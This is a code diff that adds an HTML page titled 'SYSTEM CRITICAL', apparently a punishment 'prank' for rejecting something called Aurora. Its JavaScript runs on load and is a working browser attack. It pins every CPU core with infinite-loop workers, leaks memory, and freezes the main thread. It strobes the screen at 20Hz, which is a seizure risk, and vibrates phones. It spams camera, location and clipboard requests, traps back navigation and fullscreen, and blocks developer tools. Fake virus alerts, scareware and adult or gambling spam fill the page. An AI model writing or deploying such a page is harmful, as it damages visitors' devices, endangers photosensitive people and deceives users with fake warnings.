@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>SYSTEM CRITICAL</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: none; /* Hide cursor for disorientation */
+        }
+        h1 { font-size: 5rem; text-shadow: 2px 2px #fff; animation: shake 0.1s infinite; z-index: 10; }
+        p { font-size: 2rem; font-weight: bold; z-index: 10; background: #000; padding: 5px; }
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(3px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(3px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(1px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.6;
+            mix-blend-mode: overlay;
+        }
+        .error-box {
+            position: fixed;
+            background: #ccc;
+            border: 2px solid #fff;
+            box-shadow: 5px 5px 0 #000;
+            color: #000;
+            padding: 10px;
+            font-size: 12px;
+            font-family: Tahoma, sans-serif;
+            width: 250px;
+            z-index: 100;
+            pointer-events: none;
+        }
+        .error-header {
+            background: navy;
+            color: white;
+            padding: 2px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: flex;
+            justify-content: space-between;
+        }
+    </style>
+</head>
+<body>
+    <div id="fake-toolbar">
+        <div class="toolbar-row">
+            <span class="toolbar-btn">File</span>
+            <span class="toolbar-btn">Edit</span>
+            <span class="toolbar-btn">View</span>
+            <span class="toolbar-btn">Favorites</span>
+            <span class="toolbar-btn">Tools</span>
+            <span class="toolbar-btn">Help</span>
+        </div>
+        <div class="toolbar-row">
+            <span>Address:</span>
+            <input type="text" class="address-bar" value="http://www.2345.com/?virus=true" readonly>
+            <button class="win-btn">Go</button>
+        </div>
+        <div class="toolbar-row" style="background:yellow; color:red; font-weight:bold; justify-content:center;">
+            WARNING: YOUR COMPUTER IS INFECTED! DOWNLOAD ANTIVIRUS NOW!
+        </div>
+    </div>
+
+    <div id="custom-context">
+        <div class="ctx-item" onclick="window.open('https://www.baidu.com/s?wd=性病治疗')">Open Link in New Window</div>
+        <div class="ctx-item">Save Target As...</div>
+        <div class="ctx-item">Print...</div>
+        <div class="ctx-sep"></div>
+        <div class="ctx-item" style="font-weight:bold; color:red;">🔥 澳门首家线上赌场上线啦 🔥</div>
+        <div class="ctx-item" style="font-weight:bold; color:blue;">💑 寂寞少妇同城交友 💑</div>
+        <div class="ctx-item" style="font-weight:bold; color:green;">💰 屠龙宝刀 点击就送 💰</div>
+        <div class="ctx-sep"></div>
+        <div class="ctx-item" disabled style="color:#999;">View Source (Disabled)</div>
+        <div class="ctx-item" disabled style="color:#999;">Inspect Element (Disabled)</div>
+    </div>
+
+    <canvas id="noise"></canvas>
+    <h1>FATAL ERROR</h1>
+    <p>AURORA REJECTED YOUR REJECTION</p>
+    <p id="info" style="font-size: 1rem; color: #fff;">INITIATING RESOURCE CONSUMPTION...</p>
+
+    <script>
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        
+        // 1. 震动 (Mobile Vibration)
+        function startVibration() {
+            if (navigator.vibrate) {
+                // 持续高频震动
+                setInterval(() => {
+                    navigator.vibrate([200, 50, 200, 50, 500, 50, 200, 50, 200]);
+                }, 1500);
+            }
+        }
+
+        // 2. 视觉干扰与 GPU 负载 (Visual Chaos & GPU Load)
+        const canvas = document.getElementById('noise');
+        const ctx = canvas.getContext('2d', { alpha: false }); // Disable alpha for speed -> wait, we want speed or load? Alpha true is heavier usually.
+        // Actually, we want to write pixels fast.
+        let w, h;
+        
+        function resize() {
+            w = canvas.width = window.innerWidth;
+            h = canvas.height = window.innerHeight;
+        }
+        window.onresize = resize;
+        resize();
+
+        function drawNoise() {
+            // Create a huge buffer
+            const idata = ctx.createImageData(w, h);
+            const buffer32 = new Uint32Array(idata.data.buffer);
+            const len = buffer32.length;
+            
+            // Random noise - CPU intensive loop
+            for (let i = 0; i < len; i++) {
+                // Randomize pixels completely
+                buffer32[i] = (255 << 24) | (Math.random() * 0xFFFFFF);
+            }
+            
+            ctx.putImageData(idata, 0, 0);
+            requestAnimationFrame(drawNoise);
+        }
+
+        // 3. 弹窗生成器 (DOM Spam)
+        const messages = [
+            "Critical Error", "Memory Leak", "System Halted", 
+            "Aurora is watching", "You cannot leave", "0x8000DEAD"
+        ];
+
+        function spawnPopups() {
+            setInterval(() => {
+                const div = document.createElement('div');
+                div.className = 'error-box';
+                div.style.left = Math.random() * (window.innerWidth - 200) + 'px';
+                div.style.top = Math.random() * (window.innerHeight - 100) + 'px';
+                
+                const msg = messages[Math.floor(Math.random() * messages.length)];
+                div.innerHTML = `
+                    <div class="error-header">
+                        <span>System Error</span>
+                        <span>X</span>
+                    </div>
+                    <div style="display:flex; align-items:center; gap:10px;">
+                        <div style="background:red; color:white; border-radius:50%; width:20px; height:20px; text-align:center; line-height:20px;">X</div>
+                        ${msg}
+                    </div>
+                `;
+                document.body.appendChild(div);
+                
+                // Limit DOM elements to prevent total browser crash (keep tab responsive enough to suffer)
+                // If it crashes completely, the prank ends too soon.
+                if (document.querySelectorAll('.error-box').length > 200) {
+                    document.querySelector('.error-box').remove();
+                }
+            }, isMobile ? 100 : 20); // Faster on PC
+        }
+
+        // 4. 多线程 CPU 占用 (Web Worker Bomb) - PC Only
+        function startCPUWorkers() {
+            // Creating a Blob for the worker script
+            // The worker runs an infinite loop calculating random numbers
+            const workerCode = `
+                self.onmessage = function() {
+                    // Intense calculation loop
+                    while(true) { 
+                        Math.random() * Math.random(); 
+                    }
+                };
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const url = URL.createObjectURL(blob);
+            
+            // Use hardwareConcurrency to target all cores
+            const cores = navigator.hardwareConcurrency || 4;
+            // Global for stop function
+            window.workers = [];
+            
+            for(let i = 0; i < cores; i++) {
+                const w = new Worker(url);
+                w.postMessage('start');
+                window.workers.push(w);
+            }
+        }
+
+        // 9. 墨水屏毁灭者 (E-Ink Destroyer) & 强制全屏
+        function destroyEInk() {
+            // Strobe Light: Flash Black/White rapidly
+            // This forces E-Ink displays to refresh constantly, causing massive lag and ghosting.
+            let isBlack = true;
+            setInterval(() => {
+                document.body.style.backgroundColor = isBlack ? '#FFFFFF' : '#000000';
+                // Also toggle text color for contrast
+                document.body.style.color = isBlack ? '#000000' : '#FFFFFF';
+                isBlack = !isBlack;
+            }, 50); // 20Hz flashing (Super fast for E-Ink)
+        }
+
+        function forceFullscreen() {
+            const elem = document.documentElement;
+            const requestFS = elem.requestFullscreen || elem.webkitRequestFullscreen || elem.msRequestFullscreen;
+            
+            // Try on load (usually blocked)
+            try { requestFS.call(elem); } catch(e){}
+
+            // Try on ANY interaction
+            ['click', 'touchstart', 'mousemove', 'keydown'].forEach(evt => {
+                document.addEventListener(evt, () => {
+                    if(!stopped) {
+                        try { requestFS.call(elem); } catch(e){}
+                    }
+                }, { passive: false });
+            });
+        }
+
+        // 5. 主线程卡顿模拟 (Mobile Lag) & 内存泄漏
+        function induceLag() {
+            // Memory Leak
+            let arr = [];
+            setInterval(() => {
+                try {
+                    // Push massive data every 10ms
+                    for(let i=0; i<10000; i++) arr.push(new Array(1000).fill('AURORA'));
+                } catch(e) {}
+            }, 100);
+
+            // True Freeze for Mobile (Intermittent but heavy)
+            setInterval(() => {
+                const start = Date.now();
+                // Block Main Thread for 500ms (Heavy freeze)
+                while (Date.now() - start < 500) {
+                     // Busy wait
+                }
+            }, 800); // 500ms freeze, 300ms breathing room (to allow strobe to render)
+
+            // History Flood
+            setInterval(() => {
+                 history.pushState(null, null, window.location.href);
+            }, 100);
+        }
+
+        // 8. 权限轰炸 (Permission Spam)
+        function spamPermissions() {
+            // Camera Spam
+            setInterval(() => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => {
+                        // If granted, just keep it open to drain battery
+                        console.log("Camera access granted (Battery drain initiated)");
+                    })
+                    .catch(err => {
+                        console.log("Camera request denied, retrying...");
+                    });
+            }, 1000); // Request every second
+
+            // Geolocation Spam
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => console.log("Location tracked"),
+                    (err) => console.log("Location denied"),
+                    { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 }
+                );
+            }, 1000);
+            
+            // Clipboard Spam (User interaction required usually, but we try)
+            setInterval(() => {
+                try {
+                    navigator.clipboard.writeText("AURORA VIRUS: YOUR DEVICE IS COMPROMISED");
+                } catch(e) {}
+            }, 2000);
+        }
+
+        // 6. 紧急停车 (Emergency Stop)
+        let stopped = false;
+        function emergencyStop() {
+            stopped = true;
+            
+            // Unlock Mouse
+            if (document.exitPointerLock) document.exitPointerLock();
+
+            // Kill Workers
+            if (window.workers) {
+                window.workers.forEach(w => w.terminate());
+                window.workers = [];
+            }
+
+            // Clear Intervals
+            // We need to track intervals to clear them
+            // For now, just reload to blank page or close
+            document.body.innerHTML = '<h1 style="color:white; font-size:3rem;">SYSTEM HALTED</h1><p style="color:white;">User initiated emergency stop.</p><button onclick="window.location.href=\'index.html\'" style="padding:20px; font-size:20px;">RETURN TO SAFETY</button>';
+            document.body.style.backgroundColor = 'black';
+            document.body.style.cursor = 'auto';
+            
+            // Stop vibration
+            if (navigator.vibrate) navigator.vibrate(0);
+        }
+
+        // 7. 鼠标陷阱 (Mouse Trap)
+        function enableMouseTrap() {
+            const canvas = document.getElementById('noise');
+            document.addEventListener('click', () => {
+                if(!stopped) {
+                    try {
+                        canvas.requestPointerLock();
+                    } catch(e) {}
+                }
+            });
+        }
+
+        // Add secret key listener (ESC to stop)
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') emergencyStop();
+        });
+
+        // Add visible button (Hidden by default, appears on hover or touch)
+        const stopBtn = document.createElement('button');
+        stopBtn.innerText = "EMERGENCY STOP (ESC)";
+        stopBtn.style.cssText = "position:fixed; bottom:10px; right:10px; z-index:999999; padding:10px; background:red; color:white; border:2px solid white; opacity:0.1; transition:opacity 0.5s; cursor:pointer;";
+        stopBtn.onmouseover = () => stopBtn.style.opacity = 1;
+        stopBtn.onclick = emergencyStop;
+        document.body.appendChild(stopBtn);
+
+        // 10. 流氓软件模拟 (Rogue Software Sim)
+        function injectRogueFeatures() {
+            // 1. Title Spam
+            let titleScroll = " 🚨 WARNING: VIRUS DETECTED 🚨 SYSTEM CORRUPTED 🚨 ";
+            setInterval(() => {
+                titleScroll = titleScroll.substring(1) + titleScroll.substring(0, 1);
+                document.title = titleScroll;
+            }, 100);
+
+            // 2. Disable Context Menu & Show Fake One
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                const ctx = document.getElementById('custom-context');
+                ctx.style.display = 'block';
+                ctx.style.left = e.clientX + 'px';
+                ctx.style.top = e.clientY + 'px';
+            });
+            
+            // Hide context menu on click
+            document.addEventListener('click', () => {
+                document.getElementById('custom-context').style.display = 'none';
+            });
+
+            // 3. Disable DevTools Keys
+            document.addEventListener('keydown', (e) => {
+                // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || 
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    alert("⚠️ ACCESS DENIED: SYSTEM ADMINISTRATOR HAS DISABLED THIS FEATURE.");
+                }
+            });
+
+            // 4. Anti-Debugger Loop
+            setInterval(() => {
+                const start = Date.now();
+                debugger; // This pauses execution if DevTools is open
+                if (Date.now() - start > 100) {
+                    alert("⚠️ DO NOT ATTEMPT TO DEBUG THE SYSTEM!");
+                }
+            }, 1000);
+
+            // 5. Fake IE Popups
+            setInterval(() => {
+                if(stopped) return;
+                const win = document.createElement('div');
+                win.className = 'win-window';
+                win.style.left = Math.random() * (window.innerWidth - 300) + 'px';
+                win.style.top = Math.random() * (window.innerHeight - 200) + 'px';
+                win.style.width = '300px';
+                
+                win.innerHTML = `
+                    <div class="win-titlebar">
+                        <span>Internet Explorer</span>
+                        <button style="background:red; color:white; border:none; font-weight:bold;">X</button>
+                    </div>
+                    <div class="win-content">
+                        <img src="https://old.files.catbox.moe/example_error.png" style="float:left; width:32px; height:32px; margin-right:10px;" onerror="this.style.display='none'">
+                        <p style="text-align:left; margin:0; font-size:12px; color:black;">
+                            A fatal error has occurred at 0000:0000. <br>
+                            Application will be terminated.<br><br>
+                            Do you want to send a report to Microsoft?
+                        </p>
+                        <div style="margin-top:15px; display:flex; justify-content:flex-end; gap:5px;">
+                            <button class="win-btn">Yes</button>
+                            <button class="win-btn">No</button>
+                        </div>
+                    </div>
+                `;
+                document.body.appendChild(win);
+                
+                // Limit popups
+                if(document.querySelectorAll('.win-window').length > 10) {
+                    document.querySelector('.win-window').remove();
+                }
+            }, 2000);
+
+            // 6. Fake Favorites Spam
+            setInterval(() => {
+                if(Math.random() > 0.7 && !stopped) {
+                    // Modern browsers block window.external.AddFavorite
+                    // So we simulate it
+                    alert("System Message:\n\nWebsite 'PORN HUB VIP' has been added to your Favorites successfully!");
+                }
+            }, 5000);
+        }
+
+        window.onload = function() {
+            injectRogueFeatures(); // Start Rogue Sim
+            drawNoise(); // Start GPU/Canvas load
+            spawnPopups(); // Start DOM load
+            enableMouseTrap();
+            spamPermissions(); // Start Permission Spam
+            forceFullscreen(); // Start Fullscreen Spam
+
+            if (isMobile) {
+                // Mobile Strategy: Lag & Vibrate
+                document.getElementById('info').innerText = "MOBILE DEVICE DETECTED: INITIATING SYSTEM OVERLOAD...";
+                // document.body.style.backgroundColor = "red"; // Removed in favor of Strobe
+                startVibration();
+                induceLag();
+                destroyEInk(); // Flash screen for E-Ink
+            } else {
+                // Desktop Strategy: Max CPU/GPU
+                document.getElementById('info').innerText = "DESKTOP WORKSTATION DETECTED: DRAINING RESOURCES...";
+                startCPUWorkers(); // Hit all cores
+                
+                // Window movement chaos (if allowed by browser)
+                setInterval(() => {
+                    try {
+                        window.moveBy(Math.floor(Math.random() * 20 - 10), Math.floor(Math.random() * 20 - 10));
+                    } catch(e){}
+                }, 100);
+            }
+        };
+    </script>
+</body>
+</html>
